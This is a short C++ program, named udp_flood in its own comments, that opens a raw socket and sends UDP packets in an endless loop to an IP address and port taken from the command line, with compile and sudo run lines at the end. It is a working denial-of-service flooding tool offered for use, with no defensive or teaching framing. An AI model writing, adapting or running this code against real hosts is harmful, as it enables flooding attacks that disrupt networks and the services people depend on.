#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define UDP_HEADER_LEN 8 // Length of UDP header

// Function to create and send a UDP packet
void sendUDPPacket(const std::string& dest_ip, int dest_port, const std::string& message) {
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in dest_addr;
        std::memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(dest_port);
        if (inet_pton(AF_INET, dest_ip.c_str(), &dest_addr.sin_addr) <= 0) {
            perror("Invalid address");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        char packet[UDP_HEADER_LEN + message.size()];
        std::memset(packet, 0, sizeof(packet));

        // UDP Header
        struct udphdr {
            uint16_t source;
            uint16_t dest;
            uint16_t len;
            uint16_t check;
        } *udp_header = reinterpret_cast<struct udphdr*>(packet);

        udp_header->source = htons(12345); // Source port (arbitrary, can be any valid port)
        udp_header->dest = htons(dest_port); // Destination port
        udp_header->len = htons(UDP_HEADER_LEN + message.size());
        udp_header->check = 0; // Checksum is optional and often zeroed for raw sockets

        // Data
        std::memcpy(packet + UDP_HEADER_LEN, message.c_str(), message.size());

        // Send packet
        ssize_t sent_bytes = sendto(sockfd, packet, sizeof(packet), 0,
                                reinterpret_cast<struct sockaddr*>(&dest_addr), sizeof(dest_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
        } else {
            std::cout << "Sent " << sent_bytes << " bytes to " << dest_ip << ":" << dest_port << std::endl;
        }

        close(sockfd);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <destination IP> <destination port> <message>" << std::endl;
        return EXIT_FAILURE;
    }

    std::string dest_ip = argv[1];
    int dest_port = std::stoi(argv[2]);
    std::string message = argv[3];

    sendUDPPacket(dest_ip, dest_port, message);

    return EXIT_SUCCESS;
}

// g++ -o udp_flood udp_flood.cpp
// sudo ./udp_flood <destination IP> <destination port> <message>
// sudo ./udp_flood 192.168.1.1 12345 "Hello, UDP!"
